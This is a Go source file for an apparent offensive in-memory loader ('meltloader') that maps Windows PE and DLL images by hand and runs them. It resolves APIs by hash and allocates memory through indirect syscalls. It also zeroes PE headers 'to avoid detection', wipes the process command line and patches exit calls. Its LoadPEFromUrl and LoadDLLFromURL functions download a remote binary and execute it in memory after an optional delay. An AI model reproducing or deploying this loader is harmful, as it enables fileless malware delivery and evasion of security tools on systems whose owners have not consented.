package pe

import (
	"fmt"
	"sync"
	"time"
	"unsafe"

	wc "github.com/carved4/go-wincall"
	"github.com/carved4/meltloader/pkg/net"
)

// Mapping represents a loaded DLL or PE in memory
type Mapping struct {
	BaseAddr uintptr
	Size     uint32
	IsDLL    bool
}

var (
	dllMappings   = make(map[uintptr]*Mapping)
	peMappings    = make(map[uintptr]*Mapping)
	mappingsMutex sync.RWMutex
)

func loadPeInternal(peBytes []byte) uintptr {
	dosHeader := (*[64]byte)(unsafe.Pointer(&peBytes[0]))
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return 0
	}
	peOffset := *(*uint32)(unsafe.Pointer(&peBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&peBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))
	sizeOfHeaders := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x3C))
	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	var baseAddr uintptr
	var regionSize uintptr = uintptr(sizeOfImage)
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&regionSize)), 0x00001000|0x00002000, 0x04)
	if ret != 0 {
		fmt.Printf("[+] ret 0x%x\n", ret)
		return 0
	}
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), sizeOfHeaders)
	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(&peBytes[0])), sizeOfHeaders)
	copy(dstSlice, srcSlice)
	peOffset = *(*uint32)(unsafe.Pointer(&peBytes[60]))
	peHeaderAddr = uintptr(unsafe.Pointer(&peBytes[peOffset]))
	numSections := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
	sizeOfOptHeader := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))

	for i := uint16(0); i < numSections; i++ {
		sectionFileHeader := uintptr(unsafe.Pointer(&peBytes[0])) + uintptr(peOffset) + 0x18 + uintptr(sizeOfOptHeader) + uintptr(i*40)

		virtualAddress := *(*uint32)(unsafe.Pointer(sectionFileHeader + 0x0C))
		sizeOfRawData := *(*uint32)(unsafe.Pointer(sectionFileHeader + 0x10))
		pointerToRawData := *(*uint32)(unsafe.Pointer(sectionFileHeader + 0x14))

		if sizeOfRawData == 0 {
			continue
		}
		dest := baseAddr + uintptr(virtualAddress)
		src := uintptr(unsafe.Pointer(&peBytes[pointerToRawData]))
		dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dest)), sizeOfRawData)
		srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), sizeOfRawData)
		copy(dstSlice, srcSlice)
	}
	// fmt.Printf("[+] PE sections copied\n")
	peHeaderAddrInMem := baseAddr + uintptr(peOffset)
	optHeaderAddrInMem := peHeaderAddrInMem + 0x18
	imageBase := uintptr(*(*uint64)(unsafe.Pointer(optHeaderAddrInMem + 0x18)))
	// fmt.Printf("[+] imageBase: 0x%x\n", imageBase)
	// fmt.Printf("[+] actual base: 0x%x\n", baseAddr)
	delta := int64(baseAddr) - int64(imageBase)
	// fmt.Printf("[+] delta: 0x%x\n", delta)
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	optHeaderAddr = peHeaderAddr + 0x18
	relocDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (5 * 8)))
	relocDirSize := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (5 * 8) + 4))
	if relocDirRVA == 0 || relocDirSize == 0 {
		fmt.Println("[+] no relocations needed")
		return baseAddr
	}
	relocDir := baseAddr + uintptr(relocDirRVA)
	relocEnd := relocDir + uintptr(relocDirSize)
	for relocDir < relocEnd {
		pageRVA := *(*uint32)(unsafe.Pointer(relocDir))
		blockSize := *(*uint32)(unsafe.Pointer(relocDir + 4))
		if blockSize == 0 || blockSize < 8 {
			break
		}
		entryCount := (blockSize - 8) / 2
		entries := relocDir + 8
		for i := uint32(0); i < entryCount; i++ {
			entry := *(*uint16)(unsafe.Pointer(entries + uintptr(i*2)))
			relocType := entry >> 12
			offset := entry & 0xFFF
			if relocType == 0 {
				continue
			}
			patchAddr := baseAddr + uintptr(pageRVA) + uintptr(offset)
			if relocType == 10 {
				oldValue := *(*uint64)(unsafe.Pointer(patchAddr))
				newValue := uint64(int64(oldValue) + delta)
				*(*uint64)(unsafe.Pointer(patchAddr)) = newValue
			} else if relocType == 3 { // IMAGE_REL_BASED_HIGHLOW (x86)
				oldValue := *(*uint32)(unsafe.Pointer(patchAddr))
				newValue := uint32(int32(oldValue) + int32(delta))
				*(*uint32)(unsafe.Pointer(patchAddr)) = newValue
			}
		}
		relocDir += uintptr(blockSize)
	}

	// fmt.Printf("[+] resolving imports\n")
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	optHeaderAddr = peHeaderAddr + 0x18
	importDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (1 * 8)))
	if importDirRVA == 0 {
		// fmt.Println("[+] no imports")
	}

	// Get ExitThread address for patching exit functions
	k32Base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	exitThreadAddr := wc.GetFunctionAddress(k32Base, wc.GetHash("ExitThread"))

	importDesc := baseAddr + uintptr(importDirRVA)
	for {
		originalFirstThunk := *(*uint32)(unsafe.Pointer(importDesc + 0x00))
		nameRVA := *(*uint32)(unsafe.Pointer(importDesc + 0x0C))
		firstThunk := *(*uint32)(unsafe.Pointer(importDesc + 0x10))
		if nameRVA == 0 {
			break
		}
		dllNameAddr := baseAddr + uintptr(nameRVA)
		length := 0
		for {
			c := *(*byte)(unsafe.Pointer(dllNameAddr + uintptr(length)))
			if c == 0 {
				break
			}
			length++
		}
		dllName := string(unsafe.Slice((*byte)(unsafe.Pointer(dllNameAddr)), length))

		// fmt.Printf("[+] processing imports from: %s\n", dllName)
		hModule := wc.LoadLibraryLdr(dllName)
		if hModule == 0 {
			// fmt.Printf("[+] failed to load %s\n", dllName)
			importDesc += 20
			continue
		}
		thunkRVA := originalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = firstThunk
		}

		thunkAddr := baseAddr + uintptr(thunkRVA) // Read from ILT
		iatAddr := baseAddr + uintptr(firstThunk) // Write to IAT
		for {
			thunkValue := *(*uint64)(unsafe.Pointer(thunkAddr)) // x64

			if thunkValue == 0 {
				break
			}

			var funcAddr uintptr
			var funcName string
			if (thunkValue & 0x8000000000000000) != 0 { // x64 ordinal flag
				ordinal := uint16(thunkValue & 0xFFFF)
				funcAddr, _, _ = wc.Call("kernel32.dll", "GetProcAddress", hModule, ordinal)
			} else {
				importByNameAddr := baseAddr + uintptr(thunkValue)
				funcNameAddr := importByNameAddr + 2
				length := 0
				for {
					c := *(*byte)(unsafe.Pointer(funcNameAddr + uintptr(length)))
					if c == 0 {
						break
					}
					length++
				}
				funcName = string(unsafe.Slice((*byte)(unsafe.Pointer(funcNameAddr)), length))
				funcAddr = wc.GetFunctionAddress(hModule, wc.GetHash(funcName))
			}

			if funcAddr == 0 {
				// fmt.Printf("[+] failed to resolve!\n")
			}

			// Patch exit functions to ExitThread to prevent process termination
			if funcName == "exit" || funcName == "ExitProcess" || funcName == "_exit" || funcName == "_Exit" || funcName == "quick_exit" {
				funcAddr = exitThreadAddr
			}

			*(*uint64)(unsafe.Pointer(iatAddr)) = uint64(funcAddr)
			thunkAddr += 8
			iatAddr += 8
		}
		importDesc += 20
	}

	// fmt.Println("[+] imports resolved")
	// fmt.Printf("[+] running TLS callbacks\n")
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	optHeaderAddr = peHeaderAddr + 0x18

	magic := *(*uint16)(unsafe.Pointer(optHeaderAddr))
	is64bit := magic == 0x020B

	var dataDirOffset uintptr
	if is64bit {
		dataDirOffset = 0x70
	} else {
		dataDirOffset = 0x60
	}

	tlsDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + dataDirOffset + (9 * 8)))

	if tlsDirRVA == 0 {
		// fmt.Println("[+] no TLS callbacks")
	}
	tlsDir := baseAddr + uintptr(tlsDirRVA)
	var callbacksVA uint64
	if is64bit {
		callbacksVA = *(*uint64)(unsafe.Pointer(tlsDir + 0x18))
	} else {
		callbacksVA = uint64(*(*uint32)(unsafe.Pointer(tlsDir + 0x0C)))
	}
	if callbacksVA == 0 {
		// fmt.Println("[+] no TLS callbacks (array is NULL)")
	}
	if callbacksVA > uint64(baseAddr) && callbacksVA < uint64(baseAddr+0x10000000) {
		callbackArrayAddr := uintptr(callbacksVA)
		index := 0
		for {
			var callbackVA uint64
			if is64bit {
				callbackVA = *(*uint64)(unsafe.Pointer(callbackArrayAddr + uintptr(index*8)))
			} else {
				callbackVA = uint64(*(*uint32)(unsafe.Pointer(callbackArrayAddr + uintptr(index*4))))
			}

			if callbackVA == 0 {
				break
			}
			// its just an amstdcall so we can use CallG0 with callback VA as func addr, baseAddr, and 1=DLL_PROCESS_ATTACH
			wc.CallG0(uintptr(callbackVA), baseAddr, 1, 0)

			index++
		}
	}
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	numSections = *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
	sizeOfOptHeader = *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))
	sectionHeaderAddr := peHeaderAddr + 0x18 + uintptr(sizeOfOptHeader)

	// fmt.Printf("[+] setting protections for %d sections\n", numSections)

	for i := uint16(0); i < numSections; i++ {
		sectionHeader := sectionHeaderAddr + uintptr(i*40)

		virtualSize := *(*uint32)(unsafe.Pointer(sectionHeader + 0x08))
		virtualAddress := *(*uint32)(unsafe.Pointer(sectionHeader + 0x0C))
		characteristics := *(*uint32)(unsafe.Pointer(sectionHeader + 0x24))

		if virtualSize == 0 {
			continue
		}

		sectionAddr := baseAddr + uintptr(virtualAddress)
		var protection uint32
		if (characteristics & 0x20000000) != 0 { // Execute
			if (characteristics & 0x80000000) != 0 { // Write
				protection = 0x40 // PAGE_EXECUTE_READWRITE
			} else {
				protection = 0x20 // PAGE_EXECUTE_READ
			}
		} else {
			if (characteristics & 0x80000000) != 0 { // Write
				protection = 0x04 // PAGE_READWRITE
			} else {
				protection = 0x02 // PAGE_READONLY
			}
		}
		var oldProtect uint32
		ntProt := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
		currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
		var baseAddrPtr uintptr = sectionAddr
		var regionSizeVar uintptr = uintptr(virtualSize)
		ret, _ := wc.IndirectSyscall(
			ntProt.SSN,
			ntProt.Address,
			currProc,
			uintptr(unsafe.Pointer(&baseAddrPtr)),
			uintptr(unsafe.Pointer(&regionSizeVar)),
			uintptr(protection),
			uintptr(unsafe.Pointer(&oldProtect)))

		if ret != 0 {
			fmt.Printf("[-] ntprot returned 0x%x\n", ret)
		}
	}
	var tHandle uintptr
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddrInMem = baseAddr + uintptr(peOffset)
	optHeaderAddrInMem = peHeaderAddrInMem + 0x18
	entryPointRVA := *(*uint32)(unsafe.Pointer(optHeaderAddrInMem + 0x10))
	entryPoint := baseAddr + uintptr(entryPointRVA)

	// zero out pe headers to avoid detection
	for i := uintptr(0); i < uintptr(sizeOfHeaders); i++ {
		*(*byte)(unsafe.Pointer(baseAddr + i)) = 0
	}

	// zero out command line args to prevent leakage
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	getPeb := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlGetCurrentPeb"))
	pebAddr, _, _ := wc.CallG0(getPeb)
	if pebAddr != 0 {
		processParamsOffset := uintptr(0x20)
		processParams := *(*uintptr)(unsafe.Pointer(pebAddr + processParamsOffset))
		if processParams != 0 {
			commandLineOffset := uintptr(0x70)
			commandLineUnicode := (*struct {
				Length        uint16
				MaximumLength uint16
				_             uint32
				Buffer        uintptr
			})(unsafe.Pointer(processParams + commandLineOffset))

			if commandLineUnicode.Buffer != 0 && commandLineUnicode.Length > 0 {
				cmdLineSlice := unsafe.Slice((*byte)(unsafe.Pointer(commandLineUnicode.Buffer)), commandLineUnicode.MaximumLength)
				for i := range cmdLineSlice {
					cmdLineSlice[i] = 0
				}
				commandLineUnicode.Length = 0
			}
		}
	}

	// fmt.Printf("[+] entry point at 0x%x\n", entryPoint)
	rtlCreateUserThread := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
	ret, _, _ = wc.CallG0(rtlCreateUserThread, currProc, 0, 0, 0, 0, 0, entryPoint, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
	if ret != 0 {
		// fmt.Printf("[+] entry point failed to execute %x", ret)
	}
	wc.Call("kernel32.dll", "WaitForSingleObject", tHandle, 0xFFFFFFFF)
	return baseAddr
}

func LoadPe(peBytes []byte) {
	loadPeInternal(peBytes)
}

// LoadDLLFromURL downloads and loads a DLL from a URL with optional export execution
func LoadDLLFromURL(url string, exportSpec string) (*Mapping, error) {
	// Download the DLL bytes
	dllBytes, err := net.DownloadToMemory(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download DLL: %w", err)
	}

	// Parse PE headers to get size
	if len(dllBytes) < 64 || dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE file")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dllBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&dllBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))

	// Load the DLL using LoadDLLRemote into our own process
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")

	// Get base address before loading
	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	var baseAddr uintptr
	var regionSize uintptr = uintptr(sizeOfImage)
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&regionSize)), 0x00001000|0x00002000, 0x04)
	if ret != 0 {
		return nil, fmt.Errorf("failed to allocate memory")
	}

	// Load the DLL into our process
	err = LoadDLLRemote(currProc, dllBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to load DLL: %w", err)
	}

	// Create mapping entry
	mapping := &Mapping{
		BaseAddr: baseAddr,
		Size:     sizeOfImage,
		IsDLL:    true,
	}

	// Store in tracking map
	mappingsMutex.Lock()
	dllMappings[baseAddr] = mapping
	mappingsMutex.Unlock()

	return mapping, nil
}

// LoadPEFromUrl downloads and loads a PE from a URL with optional sleep before execution
func LoadPEFromUrl(url string, sleepSeconds int) (*Mapping, error) {
	// Download the PE bytes
	peBytes, err := net.DownloadToMemory(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download PE: %w", err)
	}

	// Parse PE headers to get size
	if len(peBytes) < 64 || peBytes[0] != 'M' || peBytes[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE file")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&peBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&peBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))

	// Optional sleep
	if sleepSeconds > 0 {
		time.Sleep(time.Duration(sleepSeconds) * time.Second)
	}

	// Load the PE and get the base address
	baseAddr := loadPeInternal(peBytes)
	if baseAddr == 0 {
		return nil, fmt.Errorf("failed to load PE")
	}

	// Create mapping entry
	mapping := &Mapping{
		BaseAddr: baseAddr,
		Size:     sizeOfImage,
		IsDLL:    false,
	}

	// Store in tracking map
	mappingsMutex.Lock()
	peMappings[baseAddr] = mapping
	mappingsMutex.Unlock()

	return mapping, nil
}

// GetMap returns information about currently mapped DLLs
func GetMap() ([]uintptr, []uint32, int) {
	mappingsMutex.RLock()
	defer mappingsMutex.RUnlock()

	count := len(dllMappings)
	baseAddrs := make([]uintptr, 0, count)
	sizes := make([]uint32, 0, count)

	for _, mapping := range dllMappings {
		baseAddrs = append(baseAddrs, mapping.BaseAddr)
		sizes = append(sizes, mapping.Size)
	}

	return baseAddrs, sizes, count
}

// GetPEMap returns information about currently mapped PEs
func GetPEMap() ([]uintptr, []uint32, int) {
	mappingsMutex.RLock()
	defer mappingsMutex.RUnlock()

	count := len(peMappings)
	baseAddrs := make([]uintptr, 0, count)
	sizes := make([]uint32, 0, count)

	for _, mapping := range peMappings {
		baseAddrs = append(baseAddrs, mapping.BaseAddr)
		sizes = append(sizes, mapping.Size)
	}

	return baseAddrs, sizes, count
}

// Melt removes a DLL mapping from memory and tracking
func Melt(mapping *Mapping) error {
	if mapping == nil {
		return fmt.Errorf("nil mapping")
	}

	// Remove from tracking
	mappingsMutex.Lock()
	delete(dllMappings, mapping.BaseAddr)
	mappingsMutex.Unlock()

	// Free the memory
	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	var baseAddr uintptr = mapping.BaseAddr
	var regionSize uintptr = 0

	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000) // MEM_RELEASE
	if ret != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
	}

	return nil
}

// MeltPE removes a PE mapping from memory and tracking
func MeltPE(mapping *Mapping) error {
	if mapping == nil {
		return fmt.Errorf("nil mapping")
	}

	// Remove from tracking
	mappingsMutex.Lock()
	delete(peMappings, mapping.BaseAddr)
	mappingsMutex.Unlock()

	// Free the memory
	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	var baseAddr uintptr = mapping.BaseAddr
	var regionSize uintptr = 0

	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000) // MEM_RELEASE
	if ret != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
	}

	return nil
}
